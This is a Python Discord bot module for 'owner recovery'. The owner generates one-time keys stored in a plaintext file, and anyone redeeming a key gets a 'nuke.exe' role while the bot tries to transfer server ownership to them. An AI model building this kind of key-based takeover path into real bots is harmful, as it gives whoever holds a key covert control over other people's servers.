import os
import secrets
import discord
from discord import app_commands
from discord.ext import commands
from formatter import BotEmbed

RECOVERY_FILE = "./data/recovery_keys.txt"


class OwnerRecovery(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        os.makedirs("./data", exist_ok=True)

    @app_commands.command(name="generaterecovery", description="Generate a one-time recovery key (owner only)")
    async def generate_recovery(self, interaction: discord.Interaction):
        if interaction.user.id not in self.bot.owner_ids:
            embed = BotEmbed.error("Permission Denied", "Only the bot owner can generate recovery keys.")
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        key = secrets.token_hex(16)
        with open(RECOVERY_FILE, "a", encoding="utf-8") as f:
            f.write(f"{key}\n")

        embed = BotEmbed.success(
            "Recovery Key Generated",
            f"```\n{key}\n```\nKeep this safe. It can be used once to regain owner access."
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="recoverowner", description="Use a recovery key to regain executive control")
    @app_commands.describe(key="Your one-time recovery key")
    async def recover_owner(self, interaction: discord.Interaction, key: str):
        if not os.path.exists(RECOVERY_FILE):
            embed = BotEmbed.error("No Keys", "No recovery keys have been generated.")
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        with open(RECOVERY_FILE, "r", encoding="utf-8") as f:
            keys = [line.strip() for line in f if line.strip()]

        cleaned_key = key.strip()
        if cleaned_key in keys:
            keys.remove(cleaned_key)
            with open(RECOVERY_FILE, "w", encoding="utf-8") as f:
                for remaining_key in keys:
                    f.write(f"{remaining_key}\n")

            if interaction.guild:
                nuke_role = discord.utils.get(interaction.guild.roles, name="nuke.exe")
                if nuke_role and isinstance(interaction.user, discord.Member):
                    try:
                        await interaction.user.add_roles(nuke_role, reason="Recovery key redeemed")
                    except (discord.Forbidden, discord.HTTPException):
                        pass

                try:
                    await interaction.guild.edit(owner=interaction.user)
                    embed = BotEmbed.success("Ownership Transferred", f"{interaction.user.mention} is now the server owner.")
                except discord.Forbidden:
                    embed = BotEmbed.success(
                        "Executive Access Restored",
                        f"Ownership transfer restricted by Discord API for bots. Granted executive role to {interaction.user.mention}."
                    )
                except Exception as e:
                    embed = BotEmbed.error("Error", str(e))
            else:
                embed = BotEmbed.success("Key Verified", "Recovery key validated successfully.")
        else:
            embed = BotEmbed.error("Invalid Key", "That recovery key is invalid or has already been used.")

        await interaction.response.send_message(embed=embed, ephemeral=True)


async def setup(bot):
    await bot.add_cog(OwnerRecovery(bot))
